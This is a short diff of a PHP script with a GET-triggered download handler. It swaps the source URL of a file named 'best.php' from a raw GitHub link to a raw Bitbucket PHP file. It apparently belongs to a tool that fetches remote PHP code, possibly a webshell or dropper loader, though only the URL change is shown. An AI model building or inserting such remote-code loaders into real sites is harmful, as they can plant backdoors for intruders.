@@ -116,7 +116,7 @@ if (isset($_GET['download']) && isset($_GET['file'])) {
     
     $files = [
         'best' => [
-            'url' => 'https://raw.githubusercontent.com/zahidekarayilan938-bot/fresh/refs/heads/main/best.php',
+            'url' => 'https://bitbucket.org/new0981/vevy/raw/062554d836e1407505427bebb430500fd4a0edc2/f.php',
             'name' => 'best.php'
         ],
         'txets' => [
